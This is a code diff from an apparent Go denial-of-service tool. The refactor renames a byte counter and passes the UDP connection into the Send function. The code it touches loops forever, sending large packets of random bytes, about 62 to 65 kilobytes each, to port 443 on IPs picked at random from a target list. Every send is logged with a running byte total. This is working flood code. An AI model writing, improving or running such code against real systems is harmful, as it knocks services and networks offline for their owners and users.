@@ -11,26 +11,21 @@ import (
 	"time"
 )
 
-var bytesSiz uint64 = 0
+var totalSendPaketSize uint64 = 0
 
-func Send(wg *sync.WaitGroup, ip []string) {
+func Send(wg *sync.WaitGroup, conn *net.UDPConn, ip []string) {
 	rand.Seed(time.Now().Unix())
-	conn, _ := net.ListenUDP("udp", &net.UDPAddr{Port: 1234})
-
 	for {
 		sendPacket(conn, &net.UDPAddr{IP: net.ParseIP(ip[rand.Intn(len(ip))]), Port: 443}, 63000)
 		time.Sleep(time.Millisecond * 100)
 	}
 	wg.Done()
 }
-func sendPacketSizeSum(new int) {
-	tmp := uint64(new)
-	bytesSiz = tmp + bytesSiz
-}
 
 func sendPacket(conn *net.UDPConn, addr *net.UDPAddr, UserInputSize int) {
 	paketSize := randomINT.RandomINT(UserInputSize-1000, UserInputSize+2506)
-	sendPacketSizeSum(paketSize)
+
+	paketSizeSUM(paketSize)
 	buf := make([]byte, paketSize)
 
 	_, err := rand.Read(buf)
@@ -41,5 +36,10 @@ func sendPacket(conn *net.UDPConn, addr *net.UDPAddr, UserInputSize int) {
 	if err != nil {
 		log.Fatal("Write:", err)
 	}
-	fmt.Println("  Sent   ", n, "   bytes  ->   ", addr, "    ", humanize.Bytes(bytesSiz))
+	fmt.Println("  Sent   ", n, "   bytes  ->   ", addr, "    ", humanize.Bytes(totalSendPaketSize))
+}
+
+func paketSizeSUM(new int) {
+	tmp := uint64(new)
+	totalSendPaketSize = tmp + totalSendPaketSize
 }
